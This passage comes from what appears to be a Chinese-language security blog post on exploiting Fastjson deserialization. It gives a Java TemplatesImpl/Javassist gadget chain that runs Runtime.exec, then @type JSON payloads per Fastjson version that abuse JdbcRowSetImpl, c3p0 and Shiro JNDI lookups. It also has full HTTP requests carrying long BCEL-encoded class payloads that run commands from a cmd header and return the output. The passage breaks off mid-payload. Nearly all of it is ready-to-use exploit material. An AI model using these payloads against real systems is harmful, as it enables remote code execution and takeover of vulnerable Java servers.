jsonArray);<br>ByteArrayOutputStream barr = new ByteArrayOutputStream();<br>ObjectOutputStream objectOutputStream = new ObjectOutputStream(barr);<br>objectOutputStream.writeObject(val);<br><br>ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));<br>Object o = (Object)ois.readObject();<br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>fastjson2</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs json">import javax.management.BadAttributeValueExpException;<br>import java.io.ByteArrayInputStream;<br>import java.io.ByteArrayOutputStream;<br>import java.io.ObjectInputStream;<br>import java.io.ObjectOutputStream;<br>import java.lang.reflect.Field;<br><br>import com.alibaba.fastjson2.JSONArray;<br>import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br>import javassist.ClassPool;<br>import javassist.CtClass;<br>import javassist.CtConstructor;<br>import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><br><br>public class Test <span class="hljs-punctuation">&#123;</span><br>  public static void setValue(Object obj<span class="hljs-punctuation">,</span> String name<span class="hljs-punctuation">,</span> Object value) throws Exception<span class="hljs-punctuation">&#123;</span><br>  Field field = obj.getClass().getDeclaredField(name);<br>  field.setAccessible(<span class="hljs-literal"><span class="hljs-keyword">true</span></span>);<br>  field.set(obj<span class="hljs-punctuation">,</span> value);<br><span class="hljs-punctuation">&#125;</span><br><br>public static void main(String<span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span> args) throws Exception<span class="hljs-punctuation">&#123;</span><br>  ClassPool pool = ClassPool.getDefault();<br>  CtClass clazz = pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>  CtClass superClass = pool.get(AbstractTranslet.class.getName());<br>  clazz.setSuperclass(superClass);<br>  CtConstructor constructor = new CtConstructor(new CtClass<span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span> clazz);<br>constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;open -na Calculator\&quot;);&quot;</span>);<br>clazz.addConstructor(constructor);<br>byte<span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span> bytes = new byte<span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">&#123;</span>clazz.toBytecode()<span class="hljs-punctuation">&#125;</span>;<br>TemplatesImpl templates = TemplatesImpl.class.newInstance();<br>setValue(templates<span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;_bytecodes&quot;</span><span class="hljs-punctuation">,</span> bytes);<br>setValue(templates<span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;_name&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;y4tacker&quot;</span>);<br>setValue(templates<span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;_tfactory&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-literal"><span class="hljs-keyword">null</span></span>);<br><br><br>JSONArray jsonArray = new JSONArray();<br>jsonArray.add(templates);<br><br>BadAttributeValueExpException val = new BadAttributeValueExpException(<span class="hljs-literal"><span class="hljs-keyword">null</span></span>);<br>Field valfield = val.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>valfield.setAccessible(<span class="hljs-literal"><span class="hljs-keyword">true</span></span>);<br>valfield.set(val<span class="hljs-punctuation">,</span> jsonArray);<br>ByteArrayOutputStream barr = new ByteArrayOutputStream();<br>ObjectOutputStream objectOutputStream = new ObjectOutputStream(barr);<br>objectOutputStream.writeObject(val);<br><br>ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));<br>Object o = (Object)ois.readObject();<br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h2 id="各版本利用"><a href="#各版本利用" class="headerlink" title="各版本利用"></a>各版本利用</h2><p>除了考虑Fastjson版本，还得考虑JDK版本，中间件版本，第三方依赖版本。</p><p>JDK版本对于JDNI注入的限制，基于RMI利用的JDK版本&lt;&#x3D;6u141、7u131、8u121，基于LDAP利用的JDK版本&lt;&#x3D;6u211、7u201、8u191。（更高版本也有绕过）<br>更高版本绕过可用<a href="https://github.com/veracode-research/rogue-jndi">https://github.com/veracode-research/rogue-jndi</a></p><ol><li>jndi <ol><li>JdbcRowSetImpl</li><li>C3p0#JndiRefForwardingDataSource</li><li>JndiDataSourceFactory</li></ol></li><li>bcel <ol><li>tomcat#dbcp</li><li>ibatis</li></ol></li><li>TemplatesImpl</li></ol><hr><h3 id="Fastjson-1-2-22-1-2-24"><a href="#Fastjson-1-2-22-1-2-24" class="headerlink" title="Fastjson 1.2.22-1.2.24"></a>Fastjson 1.2.22-1.2.24</h3><p><strong>JdbcRowSetImpl</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;dataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;rmi://127.0.0.1:1099/badClassName&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><strong>c3p0#JndiRefForwardingDataSource</strong></p><p>JdbcRowSetImpl无法成功可以一试</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.mchange.v2.c3p0.JndiRefForwardingDataSource&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;jndiName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;rmi://127.0.0.1:1099/badClassName&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;loginTimeout&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">0</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><strong>shiro#JndiObjectFactory</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;resourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;rmi://127.0.0.1:9050/exploit&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><strong>shiro#JndiRealmFactory</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.shiro.realm.jndi.JndiRealmFactory&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;jndiNames&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;rmi://127.0.0.1:9050/exploit&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><strong>bcel</strong></p><p>可用于解决不出网利用。<br>需要注意在Java 8u251以后，bcel类被删除。<br>tomcat7<br>org.apache.tomcat.dbcp.dbcp.BasicDataSource<br>tomcat8及其以后<br>org.apache.tomcat.dbcp.dbcp2.BasicDataSource</p><p>Poc</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;x&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;driverClassLoader&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;driverClassName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$$BCEL$$$l$8b$I$A$...&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;x&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>exp<br>执行命令回显.</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs json">POST /json HTTP/<span class="hljs-number">1.1</span><br>Host<span class="hljs-punctuation">:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-punctuation">:</span><span class="hljs-number">9092</span><br>Content-Type<span class="hljs-punctuation">:</span> application/json<br>cmd<span class="hljs-punctuation">:</span> whoami<br>Content-Length<span class="hljs-punctuation">:</span> <span class="hljs-number">3327</span><br><br><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;x&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;driverClassLoader&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;driverClassName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$cb$5b$TW$U$ff$5dH27$c3$m$g$40$Z$d1$wX5$a0$q$7d$d8V$81Zi$c4b$F$b4F$a5$f8j$t$c3$85$MLf$e2$cc$E$b1$ef$f7$c3$be$ec$a6$df$d7u$X$ae$ddD$bf$f6$d3$af$eb$$$ba$ea$b6$ab$ae$ba$ea$7fP$7bnf$C$89$d0$afeq$ee$bd$e7$fe$ce$ebw$ce$9d$f0$cb$df$3f$3e$Ap$I$df$aaHbX$c5$IF$a5x$9e$e3$a8$8a$Xp$8ccL$c1$8b$w$U$e4$U$iW1$8e$T$i$_qLp$9c$e4x$99$e3$94$bc$9b$e4$98$e2$98VpZ$o$cep$bc$c2qVE$k$e7Tt$e2$3c$c7$F$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9a$U$af$ab0PP$b1$h$s$c7$9c$5c$85$U$f3$i$L$iE$F$96$82E$86$c4$a8$e5X$c1Q$86$d6$f4$c0$F$86X$ce$9d$T$M$j$93$96$p$a6$x$a5$82$f0$ce$Z$F$9b4$7c$d4$b4$pd$7b$3e0$cc$a5$v$a3$5c$bb$a2j$U$yQ$z$94$ac$C$9b$fc2$a8y$b7$e2$99$e2$84$r$z$3b$f2e$cfr$W$c6$cd$a2$9bY4$96$N$N$H1$a4$a0$a4$c1$81$ab$a1$8ck$M$a3$ae$b7$90$f1k$b8y$cf$u$89$eb$ae$b7$94$b9$$$K$Z$d3u$C$b1$Sd$3cq$ad$o$fc$ms6$5cs$a1z$c2$b5$e7$84$a7$c0$d3$e0$p$60$e8Z$QA$84$Y$L$C$cf$wT$C$e1S$G2l$d66$9c$85l$ce6$7c_C$F$cb$M$9b$d7$d4$a7$L$8b$c2$M$a8$O$N$d7$b1$c2p$ec$ff$e6$93$X$de$b2$bda$d0$b6Z$$$7e$d9u$7c$oA$5d$cb$8ca$a7$M$bc$92$f1C$db5$lup$92$c03$9e$V$I$aa$eb$86$ccto$b3A1$I$ca$99$J$S$cd$d1C$c3$Ja$Q$tM$d5$e5$DY$88$867$f0$s$f5$d9$y$cd1$u$ae$9fq$a80$Foix$h$efhx$X$ef$d1$e5$cc$c9i$N$ef$e3$D$86$96$acI$b0l$c1r$b2$7e$91$8eC$a6$86$P$f1$R$e9$q$z$81$ed0l$a9$85$a8$E$96$9d$cd$9b$86$e3$c8V$7c$ac$e1$T$7c$aa$e13$7c$ae$e0$a6$86$_$f0$a5l$f8W$e4$e1$f2$98$86$af$f1$8d$86$5b2T$7c$de$aeH$c7q$d3ve$d1$9dk$f9$8e$af$98$a2$iX$$$85$e85$ddRv$de$f0$83E$dfu$b2$cb$V$8a$b4$3aM$M$3dk6$9e$98$b7$a9$85$d9$v$R$U$5d$w$b0$f3$d2$e4$a3$E$8c4$91r$ae$e8$RS4$cdf$c5$f3$84$T$d4$cf$5d$e9$81$c9GQd$d9M$d4FSW$9b$a1I7$a4Yo$827$5cI$9b$N$_$a8M6mj$gjmz$7d$9e$eb$3c$8e$84$ad$ad$d7vl$D$9bK$ebl$g$bd4$b3C$ee$S$96$b3$ec$$$R$edG$g$7d$85$cf$a0$c9W$a4$gX$af$a2$feSN$c7$85i$h$9e$98$ab$e7$d6$ee$8b$60$cc4$85$ef$5b$b5$efF$y$7dQ$7eW$g$a7$f1$86$l$88R$f8$40$cexnYx$c1$N$86$7d$ff$c1$c3j$L$db$C$f7$7c$99$8cr$86$9c$9a$e6n$ad$82$b8$7c$a7$86$e5$Q$c1$bd$8d$8esE$c3$cb$cb$d7$e2$98bd$e0$o$Be$5b$c3Nt$ae$ef$e4H$7d$c6k$aa$b3$V$t$b0J$f5$c7$5c$3ft7$99Ej2$8c$89$VA$_$u$9d$de$60$Q$h$z$88$C$c9Vs$a8H$c9$b0$89B$9dt$ca$95$80$y$85A$acm$ab$87$b3$dcl$c3$F$99$f7$a47$bc$90$eck$V_$i$X$b6U$92$df$U$86$fd$ff$ceu$e3c$96E84$ef$e8$c3$B$fa$7d$91$7f$z$60$f2$ebM2C$a7$9d$b42Z$e3$83w$c1$ee$d0$86$nK2QS$s$c0$f1D$j$da$d2O$O$da$Ip$f5$kZ$aahM$c5$aa$88$9f$gL$rZ$efC$a9$82O$k$60$b4KV$a1NE$80$b6$Q$a0$d5$B$83$a9$f6h$3b$7d$e0$60$84$j$8e$N$adn$e3$91$dd$s$b2Ku$84$d0$cd$c3$89H$bbEjS1$d2$ce$b6$a6$3a$f3$f2J$d1$VJ$a2KO$84R$8f$d5$3dq$5d$d1$e3$EM$S$b4$9b$a0$ea$cf$e8$iN$s$ee$93TS$5b$efa$5b$V$3d$v$bd$8a$ed$df$p$a5$ab$S$a3$ab$b1To$fe6$3a$e4qG$ed$b8$93d$5cO$e6u$5e$c5c$a9$5d$8d$91u$k$3a$ff$J$bbg$ef$a1OW$ab$e8$afb$cf$5d$3c$9e$da$5b$c5$be$w$f6$cb$a03$a1e$3a$aaD$e7Qz$91$7e$60$9d$fe6b$a7$eeH$e6$d9$y$bb$8cAj$95$ec$85$83$5e$92IhP$b1$8d$3a$d0G$bb$n$b4$e306$n$87$OLc3f$b1$F$$R$b8I$ffR$dcB$X$beC7$7e$c0VP$a9x$80$k$fc$K$j$bfa$3b$7e$c7$O$fcAM$ff$T$bb$f0$Xv$b3$B$f4$b11$f4$b3Y$ec$a5$88$7b$d8$V$ec$c7$93$U$edY$c4$k$S$b8M$c1S$K$9eVp$a8$$$c3M$b8$7fF$n$i$da$k$c2$93s$a3$e099$3d$87k$pv$e4$l$3eQL$40E$J$A$A&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;x&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs json"><br>POST /json HTTP/<span class="hljs-number">1.1</span><br>Host<span class="hljs-punctuation">:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-punctuation">:</span><span class="hljs-number">9092</span><br>Content-Type<span class="hljs-punctuation">:</span> application/json<br>cmd<span class="hljs-punctuation">:</span> ver &amp;&amp; echo fastjson<br>Content-Length<span class="hljs-punctuation">:</span> <span class="hljs-number">3327</span><br><br><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;x&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;driverClassLoader&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;driverClassName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$95W$Jx$Ug$Z$7e$t$bb$9b$99L$s$90$y$y$n$Jm9K$Sr$ARZ$S$K$84$40$m$92$84$98$NP$O$95$c9dH$W6$3bav$96$40$ab$b6JZ$5b$LZ$Lj9$d4$Kj$3c$f0$m$d1$r$82E$bc$82$d6$fb$3e$aax$l$f5$be$8b$8fJ$7d$ff$99$Nn$c8$96$3c$3e$cf$ce$7f$7e$ffw$be$df$f7$ff$fb$f4$b5$f3$X$B$y$c1U$V$c5x$m$H$ab$f1j$d1$bcF$c6A$V$7eo$a5_4$P$wxH$c5k$f1$b0$98$3c$a2$e0u$a2$7fT$c6$n$Vy8$ac$e2$f5x$83$ca$95$c7$c4$a97$8a$e6q1$3d$o$d8$kUQ$887$vx$b3$8c$b7$c8xB$cc$8e$c98$ae$a0I$c5$J$9c$U$8c$de$aa$a0C$c6$dbd$bc$5d$c5L$i$96$f1$a4$8a$d9$a2$7f$87$8a$b98$ac$e0$94$8a$d3x$a7$8a$e9x$97$82w$8b$7e$40$c1$7b$U$bcW$c1$fbd$bc_$c6$Z$V$l$c0$HE$f3$n$V$l$c6Y$V$d5$YT0$q$fa$8f$88$e6$a3$w$aa$90$U$cd9$d1$M$L5$3e$a6$e2$3c$$$88$e6$e3b$fa$94P$f9$a2$8cO$88$c9$ra$d3$te$7cJ$82$d4$zaJ$d3n$7d$9f$5e$9dp$o$d1$ea$f5z$bc$3bl$3a$b5$Sr$c2$91$ae$98$ee$qlS$c2$fc$f1$U$cb$bd$a5$a8$k$eb$aa$de$d8$b1$db4$9c$da$V$3c$95eD$r$U$a6$ed$d5G$f5x$bc$c9$d2$3bM$9b$db$be$ee$b8$z$a1$e0$c6$7do$a7$97$ad$d1$d3$v$n$98$b6$lv$ecH$ac$8b$E$92$3dv$p$r$94$h$3c$97$bd$3c$S$8b8$x$c8$a0$b4l$b3$E$7f$bd$d5I$b5$t7EbfK$a2$a7$c3$b4$db$f5$8e$a8$v$YX$86$k$dd$ac$db$R1O$zJ$fcf$df$a8R$8b$e54X$89X$e7$da$fd$86$d9$ebD$ac$Y$r$f9$9d$eeH$5c$c2$9c$a6x$a2$a7$c7$b4$e3$a6Qm$g$ddVu$bd$Vsl$x$g5$ed$ea$baht$z$97H$9c$XvtcO$b3$de$ebJ$a1$b3$J$u$ca$8aH$I$95$8e7$a3l$hu$b7$3avK$c8o6$9dn$ab$b3U$b7$f5$k$d3$a1$U$J$d32$ih$Uv$e6v$99N$9b$Z$ef$b5bq$daP$9cFe$9b$bb$a2$q$ab$f6$98Q$9dP$daf$baM$e9$867$d2$84$$$3dZg$Yf$3c$9eNT$99$81scl$l$7d$v$I$dau$9bz$a4$d3$cfJ$a3o$b1$c2$J$a3$db$d3$p$9d$s$d7$e8$d6$e9B$a7$85f$S7$bd$7d$d7u$8cX$d5$ad$M$ba$b3$c5$8e8$$j$qKB$a0$93$t$JV$a9$d1K$s$e6$RS$889$c7$a5$G$7e$7b$e9$f1N$d3$88$ea$b6$d9$d9$Q1$a3$84QQ$G$ad$dd$z$b2$M$c4$j$ddvx$$$e6f$ee$a7e$7c$86y$xAYnDSPR$c3V$c26$cc$86$88$c0$88$96$Kl$95$60$a9$e1$rh$d3$d0$82$8d$gZ$b1$91$80$k$97$k$g$ea$b1F$c3$3a$ac$970O$ec$ee$af$8a$9b$f6$be$a8$e9Tu$3bNo$d5z6ao$a1$cd$dc$9b0$e3$8e$8c$cfj$Y$c1e$N$8dx$b1$84$db$t$3a$e4E$5d$c3$GA$3ds$o$f4j$f8$i$dad$7c$5e$c3$d3$f8$82$868h$c4$X$f12$N_$S$cdKE$f3e$7cE$c3W$f15$a6$3e$c3$b9$de$U$v$cb$i$ba$813$Bzcrj$f8$3a$be1f$dd$c3$a8$8coj$f8$W$be$ad$a1$J$cd$y3$Z$A8F$f3$cc$f0$93$b0$e0$ff$A$9f$84$db$s$80$9e$E$d9$8aW$c5$88$3a$Z$df$d1$f0$5d$7cO$c3$f7$f1$MkH_$q$d6i$f5$J$bf$fc$80$c9$b8n$f5$G$c2dS$7bC$e5$5d$9eG$3c8$8e$da1$W$a4c$m$Q6$f4X$cc$b4e$fcP$c3$V$fcH$c3$8f$f1$T$Z$3f$d5$f03$fc$5c$40$e7$X$84$fb$8e$3a$N$bf$c4$af4$fc$g$cfhx$W$bf$d1$f0$5b$81$a9$df$89$e6$f7$f8$D$f1$a8$e1$8f$f8$93$86$3f$e3$_$g$fe$8a$bf$J$a8$e9$94$be$7d$7c$z$d0$f0w$R$bb$7f$e09$a6$de$84$b5$89$85b$fbM2$a3$f0$F$b6$98$9e$Z$ab$3a$9d$T$e5$m$F$8ey$a5$e3kwY$86r$3f$b9W8$cf$z$91$ed$b6n$98c$e0$d3$dem$T$7dLh$pa$dbf$cc$Z$9dO$zMg$e5$ad$92$97b$d0F$3d$S$a3x$9f$deI$3a$85$d1J$e93$a54$93$f4$fcH$bc$$$k$X$f7$hKs$83m$f5$I$de$e3$e8DM$W$81$f7$A$qaU$G$db$b6$8f$3fu$b3$w$3c$fd$85$f6$I$bf$I1$bd$87$8eX$96$a1$dag$IzY$a6$bb0$3d7$P$c4$j$b3$c7$bb$pZm$ab$d7$b4$9d$D$y$x$T$c4$e7$fau$9b$ebXMV$9fi$d7$eb$e2j$Z$eb$f9$ebD$rc$9c$c6z$k$W$b5$yf$98$ae$ef$K$fe$b7$d7$96$889$RQ$e7Uqc$8dNBc$b8$a6$96$c5$3dk$ee7$N$be$3a$s$d0$95V$89JQ$3bFRjQ$c2$qJj$8c$f5$s$I2$e2$84$8e$u$i$95$c6$d4M$db$e0$f1$f2$d2$8c$h$Z$a4$f3$ce$d5$Sqs$8d$Z$8d$f4xy$7f$T$r$d3$8b$81$b0$wf$ee$e7$8d$p$bb$c8$8f$c6nx$H$a4I$I$ec$8a$s$e2$bc$ea$CF$d4$S$ce$_$a0$rk$d2$af6Z7$a3$b4$ecfI$9c$c7$8b$d5$ab$a3$R$f7$89$e3$_$dd$s8$fb$c8$e9$G$M$dc$MM2$d3$c4$b6$f5$D$ee$b3$8a$B$cd$e3$f1p$82H2$bc$e4$K$89$3cc$ee$d1$ae1$F$a1h$7c$d2$a5$5e$80$98$c5gh1$9f$e52$UqCB$c2Z$ce$b2$d0$c09$_K$8e$Vq$ff$b9$fd$86T$cf$db$c3$edy$df$ba$7d$ab$db$Hx$96$d70$db0gI$f2$c8b$bf$bc$fc$i$qi$IY$fc$7c$X$e0$dfz$O$81$nd$PB$O$wI$e4$MA$V$c3$5cw$a8$N$40iZ$90$c4$a4aL$f6$N$p$ff$yyMC$F$l$d4y$f0$a1$9d$dc$aa$90$cbv2$9f$fc$F$94$h$84$86$v$a4$I$d1$KAWD$caB$y$e4$83$7d$JJP$8b$Z$d8D$eai$d4c$nOl$c6$W$f2$a3F$b8$H$5b$d9o$e3$97$8f$ac$e7yH$92$b1$5d4$3b$fcP$c5$dd$cb$Ta$97$o$cb$3dQ$5c$3e$82$bcAd$97$tQp$M$B$ff$Zo$i$dc$e2$3b$c3$5dO$b3$m$r$A$b7a$S$ffS$e4c$Ou$98$ebJ$d7$3c$Ox$b9$eb$p$n$d3$8f$acI$Sv$K$8fI$5c$GE$f2$o$f1Df$3d$82l$c1H$aa$y$c9_r$g$93$H$915$o$3c$e4$h$81$ffl$f90$a6$i$97B$5c$bb$8c$87$G$a1R$85$a9I$84$8e$e1$409$fd$cb$85$e04$ffS$u$dc$ea$LN$P$tQT$ceI1$t$r$9c$cc$b8$84$e9C$b8e$Q$b7$5c$86$w$a21$802$f2$n$83$e0$ad$3e$9e$nys$F$X8$$$s5C$c5P4$7b$84$8b$9b$x$92$985$80r$d1$cf$Z$c0l$d1$cf$h$401$d5$ba$8c$a9$83$d0$ae$x$oS$R$9f$abs$b7$absG$f0$f6a$ccO$a24X$96D$f91$u$c1$F$D$I$E$x$9ay$uX$99$SL$ca$94$d8K$a8j$a9$bc$80$ea$ad$c3XHU$93X$94$c4$e2$8asxQpI$Sw$q$b14$89$3b$x$93$b8$8b$df$b2$B$f8$9b$cf$96$97$f8w$ba8$J$a0$D$P$e0$m$fd$bf$I$P$e3Q$c6$40$f4G$f8$bfN$f4$t$Y$8b$Ri$a64$87$fb$5e$b4$k$e7$K0$9fQ$x$r$82$ca$Z$9f$F$a8$q$82$W$R$M$9b$88$96$ed$iu$e0$O$d8XJ$be$b5$e4$7c$t$fa$b1$8c$bc$ea$c9$fdn$i$c2$K$3c$c6$f1$R$ac$c4Q$ac$c2$T$i$9f$40$jN2$9b$9e$e4$f84$b3$u$c9$i$3a$cf$8c$Za$be$5ca$c6$5cE$8b4$9d$8f$d3$Zh$95f$oLm$da$a4$b9h$97$e6a$8bTAD$K$b4$ec$40$OeN$a2l$83$80$e8wQ$db$c9$d1$nwdrt